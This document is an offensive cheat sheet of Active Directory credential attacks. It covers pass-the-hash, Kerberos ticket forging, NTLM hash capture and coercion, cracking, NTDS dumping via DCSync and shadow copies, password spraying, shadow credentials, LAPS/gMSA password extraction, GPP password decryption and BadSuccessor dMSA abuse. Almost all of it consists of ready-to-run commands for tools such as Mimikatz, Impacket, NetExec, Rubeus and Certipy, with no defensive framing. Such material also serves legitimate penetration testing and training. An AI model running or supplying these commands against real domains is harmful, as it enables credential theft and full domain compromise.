# AD Credential Attacks

## Pass-The-Hash (PTH)

NT or NTLM hashes only (not NTLMv1/v2). Since Vista, cannot PTH to non-RID-500 local admins.

```ps1
# Metasploit
use exploit/windows/smb/psexec
set SMBUser admin
set SMBPass aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d

# NetExec
nxc smb 10.0.0.0/24 -u admin -H ':489a04c09a5debbc9b975356693e179d' -x whoami

# Impacket
psexec.py admin@10.0.0.1 -hashes :489a04c09a5debbc9b975356693e179d

# Mimikatz / RDP
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:HASH /run:"mstsc.exe /restrictedadmin"

# Extract local SAM
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## OverPass-The-Hash (OPtH)

Use NTLM hash to request a Kerberos TGT.

```ps1
# Impacket
getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" domain.local/user
export KRB5CCNAME=user.ccache
psexec.py "domain/user@target.domain.local" -k -no-pass

# Rubeus
Rubeus.exe asktgt /user:Administrator /rc4:NTLMHASH /ptt
Rubeus.exe asktgt /user:Administrator /rc4:NTLMHASH /createnetonly:C:\Windows\System32\cmd.exe
```

## Pass-The-Key (PTK)

Use AES128/AES256 session keys instead of NTLM hash.

```ps1
# Key types: RC4=NTLM hash, AES128 (etype 17), AES256 (etype 18)

# Impacket - generate ticket
ticketer.py -aesKey AES256KEY -domain lab.local Administrator -domain-sid S-1-5-21-...

# Impacket - request TGT
getTGT.py -aesKey AES256KEY lab.local
# OR
getTGT.py -dc-ip DC_IP -hashes :NT_HASH domain.local/'machine$'

# Rubeus
Rubeus.exe asktgt /user:Administrator /aes256:AES256KEY /opsec /ptt
Rubeus.exe asktgt /user:Administrator /aes128:AES128KEY /ptt
```

## Hash Capture

```ps1
# Check LmCompatibilityLevel
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel

# NTLMv2 capture (Responder)
sudo responder -I eth0 -wfrd -P -v
# Inveigh (Windows)
.\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y

# NTLMv1 downgrade (requires LmCompatibilityLevel=0-1)
# Edit /etc/responder/Responder.conf: Challenge = 1122334455667788
responder -I eth0 --lm
PetitPotam.py -u user -p pass -d domain -dc-ip DC_IP Responder-IP DC_IP
```

## Crack Captured Hashes

```ps1
# NTLMv1 - shuck online (free if leaked in HIBP)
php shucknt.php -f tokens.txt -w pwned-passwords-ntlm-reversed-v8.bin
# Or: crack.sh/ntlmv1.com (free if challenge=1122334455667788, ~$20-200 otherwise)

# Hashcat
hashcat -m 5600 -a 0 ntlmv2.txt rockyou.txt     # NTLMv2
hashcat -m 5500 -a 3 ntlmv1.txt                 # NTLMv1 to plaintext
hashcat -m 27000 -a 0 ntlmv1.txt nthashes.txt   # NTLMv1 to NT hash
john --format=netntlmv2 hash.txt
```

## NTDS Dumping

### DCSync (requires DA or DCSync rights)

```ps1
mimikatz> lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz> lsadump::dcsync /domain:domain.local /all /csv

netexec smb 10.10.10.10 -u admin -p pass --ntds
netexec smb 10.10.10.10 -u admin -p pass --ntds drsuapi
secretsdump.py domain/admin:pass@10.10.10.10
secretsdump.py -hashes :NTHASH -just-dc domain/admin@10.10.10.10
```

### Volume Shadow Copy

```ps1
# vssadmin (on DC)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy

# ntdsutil
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

# NetExec VSS module
nxc smb 10.10.10.10 -u admin -p pass --ntds vss
```

### Forensic Tools (stealth)

```ps1
# FTK Imager → Physical Drive → export ntds.dit
# DumpIt / volatility to extract SYSTEM hive
volatility -f test.raw windows.registry.printkey.PrintKey
secretsdump.py LOCAL -system SYSTEM.reg -ntds ntds.dit
```

### Extract and Crack

```ps1
# secretsdump with local files
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
secretsdump.py -dc-ip DC_IP -use-vss -pwd-last-set -user-status domain/admin@dc

# Crack NTLM
hashcat -m 1000 -w 4 -O -a 0 hashes.txt rockyou.txt
# Online: hashmob.net, crackstation.net, hashes.com
```

### NTDS Reversible Encryption

```ps1
# List accounts with reversible encryption (UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED=0x80)
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
# secretsdump shows these as CLEARTEXT automatically
```

## Password Spraying

```ps1
# NetExec (check badPwdCount first!)
netexec ldap 10.0.0.1 -u users.txt -p 'Password123' --continue-on-success
nxc smb 10.0.0.1 -u users.txt -p 'Password123'
nxc rdp/winrm/mssql/wmi targets.txt -u admin -p 'Password123' -d domain.local

# Kerbrute (events: 4771 not 4625)
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123'
kerbrute userenum -d domain.local --dc 10.10.10.10 usernames.txt

# DomainPasswordSpray (PowerShell)
Invoke-DomainPasswordSpray -Password 'Summer2024!'
Invoke-DomainPasswordSpray -UserList users.txt -PasswordList passlist.txt -OutFile out.txt

# Check badPwdCount to avoid lockout
netexec ldap 10.0.0.1 -u user -p pass --users  # shows badpwdcount

# Common passwords: P@ssw0rd01, Welcome1, $CompanyName1, SeasonYear!
# Empty password NT hash: 31d6cfe0d16ae931b73c59d7e0c089c0
```

## Shadow Credentials

Add `msDS-KeyCredentialLink` to target → PKINIT to get TGT → UnPAC-The-Hash for NT.

**Requirements**: DC ≥ 2016, ADCS configured, PKINIT enabled, WriteProperty on target's msDS-KeyCredentialLink.

```ps1
# Certipy (auto - sets key, gets TGT, removes key)
certipy shadow auto -account targetuser -dc-ip 10.10.10.10 -u attacker@domain.lab -p Pass

# Add manually
certipy shadow -u 'attacker@domain.local' -p 'Pass' -dc-ip 10.0.0.100 -account victim add

# Whisker (Windows)
Whisker.exe list /target:computername$
Whisker.exe add /target:TARGET_SAMNAME /domain:FQDN /dc:DC /path:cert.pfx /password:pfxpass
Whisker.exe remove /target:computername$ /domain:contoso.local /dc:dc1 /remove:DEVICE-GUID

# pyWhisker (Linux)
python3 pywhisker.py -d domain.local -u attacker -p pass --target victim --action add --filename test1
python3 pywhisker.py -d domain.local -u attacker -p pass --target victim --action remove --device-id GUID

# bloodyAD
bloodyAD --host DC -u attacker -p pass -d domain.lab add shadowCredentials target$
bloodyAD --host DC -u attacker -p pass -d domain.lab remove shadowCredentials target$ --key KEY
```

## LAPS

```ps1
# Enumerate if LAPS installed
Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'

# Read LAPS password
bloodyAD -u user -p pass -d domain.lab --host DC get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
netexec ldap 10.10.10.10 -u user -H HASH -M laps

# From Windows
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))").findAll() | ForEach-Object { $_.properties }
Get-LAPSComputers   # LAPSToolkit
Find-LAPSDelegatedGroups; Find-AdmPwdExtendedRights   # LAPSToolkit

# From Linux
python pyLAPS.py --action get -u admin -d lab.local -p 'Pass' --dc-ip 192.168.2.1
python laps.py -u user -p pass -d domain.local  # LAPSDumper
ldapsearch -x -h DC -D user@domain -W -b "dc=domain,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

# Grant LAPS access (Account Operators can add to LAPS ADM/READ groups)
Add-DomainGroupMember -Identity 'LAPS READ' -Members user1
```

## GMSA

```ps1
# Read GMSA password
netexec ldap 10.10.10.10 -u user -p pass --gmsa
bloodyAD --host DC -d domain.lab -u user -p pass get search --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword

# ldeep / GMSAPasswordReader
ldeep ldap -s dc1.domain.local -u user -p pass -d domain.local gmsa
GMSAPasswordReader.exe --accountname SVC_ACCOUNT
python3 gMSADumper.py -u user -p pass -d domain.local

# PowerShell
$gmsa = Get-ADServiceAccount -Identity SVC_ACCOUNT -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
ConvertTo-NTHash -Password $mp.SecureCurrentPassword

# Golden GMSA (forge with KDS root key)
GoldenGMSA.exe kdsinfo          # dump KDS root keys
GoldenGMSA.exe gmsainfo         # list all gMSAs
GoldenGMSA.exe compute --sid S-1-5-21-...-1112 --kdskey BASE64KEY
```

## GPP / SYSVOL Passwords (MS14-025)

```ps1
# Find cpassword in SYSVOL
findstr /S /I cpassword \\DOMAIN\sysvol\DOMAIN\policies\*.xml

# Decrypt (32-byte AES key from Microsoft MSDN)
echo 'B+iL...' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

# Automated
nxc smb 10.10.10.10 -u admin -H HASH -M gpp_autologin
nxc smb 10.10.10.10 -u admin -H HASH -M gpp_password
Get-GPPPassword.py -no-pass DC.domain.local
Get-GPPPassword.py 'DOMAIN/USER:PASS'@DC
```

## DSRM Credentials

```ps1
# Dump local admin hash on DC
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Enable remote DSRM login (DsrmAdminLogonBehavior=2)
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
# Then PTH with local admin hash
```

## Passwords in AD Attributes

```ps1
# bloodyAD - search all password fields
bloodyAD -u user -p pass -d domain.lab --host DC get search --filter '(|(userPassword=*)(unixUserPassword=*)(unicodePassword=*)(description=*))' --attr userPassword,unixUserPassword,unicodePwd,description

# Description field
netexec ldap 10.0.0.1 -u user -p pass -M user-desc
netexec ldap 10.0.0.1 -u user -p pass -M get-desc-users

# Unix password attributes
nxc ldap 10.10.10.10 -u user -p pass -M get-unixUserPassword -M getUserPassword
```

## Pre-Created Computer Accounts

When "pre-Windows 2000 computer" box is checked, password = lowercase computer name.

```ps1
# Find pre-created accounts
nxc smb DC -u user -p pass -M pre2K

# Exploit: use computer$:computer as credentials
# Expected error: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT (account exists but password wrong)
# Fix password with rpcchangepwd.py
python3 rpcchangepwd.py 'DOMAIN/COMPUTER$:computer'@DC_IP -newpass 'NewPass123!'

# Create pre-created computer manually
djoin /PROVISION /DOMAIN domain.local /MACHINE evilpc /SAVEFILE C:\temp\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc
```

## dMSA / BadSuccessor (CVE, Server 2025)

**Requirements**: Windows Server 2025 DC, any OU write permission.

```ps1
# Check for Server 2025 DCs
ldapsearch "(&(objectClass=computer)(primaryGroupID=516))" dn,name,operatingsystem
MATCH (c:Computer) WHERE c.isdc = true AND c.operatingsystem CONTAINS "2025" RETURN c.name

# Automated
netexec ldap DC -u user -p pass -M badsuccessor
python bloodyAD.py --host DC -d domain.corp -u user -p pass add badSuccessor dmsADM10

# Manual
# 1. Create dMSA
New-ADServiceAccount -Name "attacker_dmsa" -DNSHostName "x.com" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "attacker-machine$" -path "OU=temp,DC=domain,DC=local"

# 2. Set migration attributes
$dMSA = [ADSI]"LDAP://CN=attacker_dmsa,OU=temp,DC=domain,DC=local"
$dMSA.Put("msDS-DelegatedMSAState", 2)
$dMSA.Put("msDS-ManagedAccountPrecededByLink", "CN=Administrator,CN=Users,DC=domain,DC=local")
$dMSA.SetInfo()

# 3. Request TGT (contains NT hash in KERB-DMSA-KEY-PACKAGE)
Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/domain.local /dmsa /opsec /nowrap /ptt /ticket:MACHINE_TGT

# 4. Dump all hashes via iteration
SharpSuccessor.exe add /impersonate:Administrator /path:"ou=temp,dc=lab,dc=lan" /account:jdoe /name:attacker_dMSA
.\Invoke-BadSuccessorKeysDump.ps1 -OU 'OU=temp,DC=domain,DC=local'
```
